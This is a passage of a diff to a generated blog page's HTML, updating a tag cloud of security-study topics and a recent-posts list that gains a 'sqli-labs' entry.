style="font-size: 10px;">ssh-copy-id</a> <a href="/tags/sysinfo/" style="font-size: 10px;">sysinfo</a> <a href="/tags/tools/" style="font-size: 10px;">tools</a> <a href="/tags/ufw/" style="font-size: 10px;">ufw</a> <a href="/tags/virt-manager/" style="font-size: 10px;">virt-manager</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/webshell/" style="font-size: 10px;">webshell</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/xss/" style="font-size: 13.33px;">xss</a> <a href="/tags/xxe/" style="font-size: 10px;">xxe</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 16.67px;">信息收集</a> <a href="/tags/%E5%8F%8D%E5%BC%B9shell/" style="font-size: 10px;">反弹shell</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 10px;">命令执行</a> <a href="/tags/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/" style="font-size: 10px;">指纹识别</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 13.33px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 10px;">文件包含</a> <a href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" style="font-size: 10px;">暴力破解</a> <a href="/tags/%E7%AB%99%E7%82%B9%E6%9E%B6%E6%9E%84/" style="font-size: 10px;">站点架构</a> <a href="/tags/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/" style="font-size: 10px;">端口扫描</a> <a href="/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/" style="font-size: 10px;">虚拟化</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" style="font-size: 10px;">计算机网络</a>
+      <a href="/tags/blog/" style="font-size: 12.5px;">blog</a> <a href="/tags/burpsuite/" style="font-size: 12.5px;">burpsuite</a> <a href="/tags/cdn/" style="font-size: 10px;">cdn</a> <a href="/tags/cookie/" style="font-size: 10px;">cookie</a> <a href="/tags/cors/" style="font-size: 10px;">cors</a> <a href="/tags/csrf/" style="font-size: 10px;">csrf</a> <a href="/tags/docker/" style="font-size: 12.5px;">docker</a> <a href="/tags/docker-compose/" style="font-size: 12.5px;">docker-compose</a> <a href="/tags/dvwa/" style="font-size: 10px;">dvwa</a> <a href="/tags/exam/" style="font-size: 15px;">exam</a> <a href="/tags/firewalld/" style="font-size: 10px;">firewalld</a> <a href="/tags/ftp/" style="font-size: 10px;">ftp</a> <a href="/tags/get/" style="font-size: 10px;">get</a> <a href="/tags/http/" style="font-size: 12.5px;">http</a> <a href="/tags/iptables/" style="font-size: 10px;">iptables</a> <a href="/tags/ip%E6%8E%A2%E6%B4%BB/" style="font-size: 10px;">ip探活</a> <a href="/tags/kls/" style="font-size: 20px;">kls</a> <a href="/tags/linux/" style="font-size: 15px;">linux</a> <a href="/tags/linux%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/" style="font-size: 10px;">linux常见服务</a> <a href="/tags/post/" style="font-size: 10px;">post</a> <a href="/tags/rce/" style="font-size: 10px;">rce</a> <a href="/tags/review/" style="font-size: 12.5px;">review</a> <a href="/tags/selinux/" style="font-size: 10px;">selinux</a> <a href="/tags/session/" style="font-size: 10px;">session</a> <a href="/tags/shell/" style="font-size: 10px;">shell</a> <a href="/tags/smb/" style="font-size: 10px;">smb</a> <a href="/tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 17.5px;">sql注入</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/ssh-copy-id/" style="font-size: 10px;">ssh-copy-id</a> <a href="/tags/sysinfo/" style="font-size: 10px;">sysinfo</a> <a href="/tags/tools/" style="font-size: 10px;">tools</a> <a href="/tags/ufw/" style="font-size: 10px;">ufw</a> <a href="/tags/virt-manager/" style="font-size: 10px;">virt-manager</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/webshell/" style="font-size: 10px;">webshell</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/xss/" style="font-size: 12.5px;">xss</a> <a href="/tags/xxe/" style="font-size: 10px;">xxe</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 15px;">信息收集</a> <a href="/tags/%E5%8F%8D%E5%BC%B9shell/" style="font-size: 10px;">反弹shell</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 10px;">命令执行</a> <a href="/tags/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/" style="font-size: 10px;">指纹识别</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 12.5px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 10px;">文件包含</a> <a href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" style="font-size: 10px;">暴力破解</a> <a href="/tags/%E7%AB%99%E7%82%B9%E6%9E%B6%E6%9E%84/" style="font-size: 10px;">站点架构</a> <a href="/tags/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/" style="font-size: 10px;">端口扫描</a> <a href="/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/" style="font-size: 10px;">虚拟化</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" style="font-size: 10px;">计算机网络</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
     </div>
   </div>
 
@@ -908,6 +919,10 @@
       <ul>
         
           <li>
+            <a href="/2024/12/26/sqli-labs/">sqli-labs</a>
+          </li>
+        
+          <li>
             <a href="/2024/12/25/day33_kls/">day33_kls</a>
           </li>
         
@@ -921,10 +936,6 @@
         
           <li>
             <a href="/2024/12/20/week6_kls_exam/">week6_kls_exam</a>
-          </li>
-        
-          <li>
-            <a href="/2024/12/20/day29_kls/">day29_kls</a>
           </li>
         
       </ul>
